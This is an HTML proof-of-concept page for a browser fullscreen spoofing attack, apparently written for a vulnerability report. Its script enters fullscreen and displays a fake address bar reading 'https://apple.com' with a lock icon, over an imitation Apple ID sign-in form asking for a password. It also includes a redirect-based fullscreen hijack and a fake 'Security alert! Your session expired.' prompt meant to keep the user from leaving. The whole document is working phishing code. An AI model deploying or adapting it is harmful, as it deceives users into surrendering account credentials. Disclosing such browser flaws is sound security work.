<!DOCTYPE html>
<html>
<head>
  <title>Fullscreen Spoofing PoC</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: black;
      color: white;
      font-family: sans-serif;
    }
    #spoofedUI {
      width: 100vw;
      height: 100vh;
      background: white;
      color: black;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .fake-url {
      font-size: 16px;
      background: #eee;
      color: #222;
      padding: 6px 12px;
      border-radius: 6px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <button onclick="triggerFullscreen()">Skenario 1: Spoof Fullscreen UI</button>
  <button onclick="simulateRedirectFullscreen()">Skenario 2: Fullscreen via Redirect</button>
  <button onclick="trapFullscreenWithPrompt()">Skenario 3: Prevent Exit with Prompt</button>

  <div id="spoofedUI" style="display:none">
    <div class="fake-url">ðŸ”’ https://apple.com</div>
    <h2>Apple ID Authentication</h2>
    <input placeholder="Apple ID" /><br><br>
    <input type="password" placeholder="Password" /><br><br>
    <button>Sign In</button>
  </div>

  <script>
    function triggerFullscreen() {
      const el = document.documentElement;
      el.requestFullscreen().then(() => {
        document.body.style.background = "white";
        document.getElementById("spoofedUI").style.display = "flex";
      });
    }

    function simulateRedirectFullscreen() {
      // Simulate a chain where fullscreen was triggered on page before redirect
      const url = new URL(window.location.href);
      if (!url.searchParams.has('redirected')) {
        window.location.href = window.location.pathname + '?redirected=true';
      } else {
        // Simulate user previously interacted and now we hijack fullscreen
        triggerFullscreen();
      }
    }

    function trapFullscreenWithPrompt() {
      triggerFullscreen();
      setTimeout(() => {
        Notification.requestPermission().then(() => {
          alert("Security alert! Your session expired.");
        });
      }, 1000);
    }
  </script>
</body>
</html>
